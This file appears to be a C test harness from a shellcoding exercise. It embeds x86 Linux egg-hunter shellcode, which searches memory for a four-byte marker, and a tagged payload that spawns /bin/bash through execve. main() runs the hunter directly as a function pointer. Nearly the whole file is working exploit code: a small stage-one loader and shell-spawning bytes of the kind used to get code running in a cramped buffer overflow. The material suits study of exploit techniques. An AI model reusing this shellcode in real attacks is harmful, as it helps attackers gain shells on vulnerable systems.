// Filename: testEggHunter.c
// Author:   boku
#include <stdio.h>
#include <string.h>
// This is the egg for our eggHunter
// the egg should be 4 bytes and be executable
#define egg "\x90\x50\x90\x50"

// Put two eggs in front of our payload
// This allows our eggHunter to find it in memory
unsigned char payload[] =
egg
egg
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f"
"\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// Replace the hardcoded egg with a variable.
// This allows us to easily change the egg for our eggHunter.
unsigned char egghunter[] =
"\xbb"
egg
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21"
"\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9"
"\xff\xe2";

// This program will run our egghunter.
// Our eggHunter will search memory until it finds 2 eggs.
// Once the payload is found it will pass control to the payload.

int main()
{
    printf("Memory Location of Payload: %p\n", payload);
    printf("Size of Egghunter:          %d\n", strlen(egghunter));
    int (*ret)() = (int(*)())egghunter;
    ret();
}
